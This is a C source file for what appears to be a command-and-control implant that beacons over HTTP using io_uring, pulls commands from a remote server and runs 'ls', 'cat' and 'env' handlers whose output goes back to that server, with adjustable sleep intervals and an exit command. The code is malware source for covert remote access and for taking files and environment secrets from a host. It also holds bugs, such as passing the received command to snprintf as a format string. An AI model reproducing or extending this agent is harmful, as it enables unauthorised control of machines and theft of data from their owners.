#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <liburing.h>
#include <errno.h>
#include <time.h>
#include "agent_functions/command_header.h"
#include "agent_functions/function_header.h"

// Constants
#define QUEUE_DEPTH 16    // Max number of rings. Like threads kinda.
#define BUFFER_SIZE 16384 // Buffer for receiving data

unsigned int sleep_int = 10;

char *get_args(char *str) {
    char *arguments = NULL;
    char *space = strchr(str, ' ');
    if (space != NULL) {
        *space = '\0';
        arguments = space + 1;
    }
    return arguments;
}

void sanitize_cmd(char *cmd) {
    size_t len = strlen(cmd);
    while (len > 0 && (cmd[len-1] == '\n' || cmd[len-1] == '\r' || cmd[len-1] == ' ' || cmd[len-1] == '\t'))
        cmd[--len] = '\0';
}

//Hash map to find functions and execute them
#define TABLE_SIZE 20
#define CMD_LEN 64

typedef void (*func_ptr)(struct io_uring *ring, int sockfd, const char *uuid, const char *args);

typedef struct {
    char command[CMD_LEN];
    func_ptr func;
} check;

check * hash_table[TABLE_SIZE];

unsigned int hash(char *name) {
    int length = strnlen(name, CMD_LEN);
    unsigned int hash_value = 0;
    for (int i = 0; i < length; i++) {
        hash_value += name[i];
        hash_value = (hash_value * name[i]) % TABLE_SIZE;
    }
    return hash_value;
}

check function[] = {
    {"ls", cmd_ls},
    {"cat", cmd_cat},
    {"env", cmd_env},
    {"NULL", NULL}
};

bool hash_insert() {
    for (int i = 0; function[i].func != NULL; i++) {
        int index = hash(function[i].command);
        if (hash_table[index] != NULL) {
            printf("ERROR: Hash Table Insert Collision!!");
            return false;
        }
        else {
            hash_table[index] = &function[i];
        }
    }
    return true;
}

void command_execute(struct io_uring *ring, int sockfd, const char *uuid, char *input) {
    sanitize_cmd(input);
    char *args = get_args(input);
    char *command = input;
    if (strcmp(command, "sleep") == 0) {
        sleep_int = atoi(args);
        send2serv(uuid, "Done", 6);
    } else {
        char lookup_key[CMD_LEN];
        snprintf(lookup_key, sizeof(lookup_key), command);
        int index = hash(lookup_key);
        if (hash_table[index] != NULL && strcmp(hash_table[index]->command, lookup_key) == 0) {
            hash_table[index]->func(ring, sockfd, uuid, args);
        } else {
            char msg[256];
            snprintf(msg, sizeof(msg), "Invalid command or Something went wrong! (%s %s) How did you do this??\n", command, args ? args : "NULL");
            send2serv(uuid, msg, strlen(msg));
        }
    }
}

// A struct to hold all the data associated with a request.

int main() {

    //Create UUID
    srand(time(NULL));
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    int charset_len = strlen(charset);

    int uuid_len = 16 + 1;
    char uuid[uuid_len + 1];
    for (int i = 0; i < uuid_len; i++) {
        int uuid_index = rand() % charset_len;
        uuid[i] = charset[uuid_index];
    }
    uuid[uuid_len] = '\0';

    struct io_uring ring;
    struct io_uring_sqe *sqe;
    struct io_uring_cqe *cqe;
    hash_insert();
    // --- 2. Initialize io_uring ---
    // This sets up the shared memory rings between our app and the kernel.
    if (io_uring_queue_init(QUEUE_DEPTH, &ring, 0) < 0) {
        perror("io_uring_queue_init");
        return 1;
    }

    
    size_t n;
    while (true) {
        request_t *req = calloc(1, sizeof(request_t));
        int sockfd = connection(&ring, req);

        if (sockfd < 0) {
            sleep(sleep_int);
            continue;
        }

        send_get(&ring, req, uuid);

        size_t total_read = 0;
        int cont_length = -1;
        int header_parsed = 0;
        size_t body_offset = 0;
        while (1) {
            req->iov.iov_base = req->buffer + total_read;
            req->iov.iov_len = BUFFER_SIZE - 1 - total_read;
            sqe = io_uring_get_sqe(&ring);
            // Prepare the SQE for a receive operation (using readv).
            io_uring_prep_readv(sqe, req->client_socket, &req->iov, 1, 0);
            io_uring_sqe_set_data(sqe, req);
            io_uring_submit(&ring);
            io_uring_wait_cqe(&ring, &cqe);
            n = cqe->res;
            io_uring_cqe_seen(&ring, cqe);
            req->buffer[n] = '\0';

            if (n <= 0) {
                break;
            }

            total_read += n;

            if (!header_parsed) {
                char *end = header_end(req->buffer);
                if (end) {
                    header_parsed = 1;
                    body_offset = end - req->buffer + 4;
                    cont_length = content_length(req->buffer);
                }
            }
            
            if (header_parsed && cont_length > -1) {
                size_t body_len = total_read - body_offset;
                if (body_len >= (size_t)content_length) {
                    break;
                }
            }

        }

        char *http_body = req->buffer + body_offset;
        
        //printf("%s", req->buffer);
        //sanitize_cmd(http_body);

        if (strcmp(http_body, "exit") == 0) {
            close(req->client_socket);
            //io_uring_queue_exit(&ring);
            free(req);
            break;
        } else if (strcmp(http_body, "") == 0) {
            close(req->client_socket);
            free(req);
            sleep(sleep_int);
            continue;
        }

        command_execute(&ring, req->client_socket, uuid, http_body);

        close(req->client_socket);
        free(req);
        sleep(sleep_int);
    }

    io_uring_queue_exit(&ring);
    return 0;
}
